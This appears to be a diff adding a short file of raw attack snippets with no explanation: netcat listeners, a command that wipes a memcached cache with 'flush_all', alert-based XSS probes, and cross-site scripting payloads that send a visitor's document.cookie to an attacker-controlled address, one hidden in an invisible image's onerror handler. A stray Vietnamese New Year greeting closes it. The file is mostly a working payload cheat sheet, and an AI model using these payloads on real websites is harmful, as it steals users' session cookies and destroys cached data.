@@ -1,0 +1,20 @@
+nc -l -p 1234 -v
+
+while true; do nc -l -p 1234 -v; done
+
+echo "flush_all" | nc -q 2 localhost 12345
+echo "flush_all" | nc -q 2 ip:1234 12345
+
+
+<script> alert('hacked') </script>
+<b onmouseover=alert(document.cookie)>Happy</b>
+<img src=abc.png onerror=alert("Hacked")>
+
+<script>new Image().src="http://ip/abc.js?output="+document.cookie;</script>
+<img src="http://ip:1234?image.png"></img>
+
+<b onmouseover="alert(document.cookie)">Click me!</b>
+
+<img src=abc style="visibility: hidden"  onerror="this.src='http://172.22.206.190:1234?'+document.cookie; this.removeAttribute('onerror');"/>
+
+Mùa xuân sang ta chúc nhau. Bao ước muốn bao hy vọng...
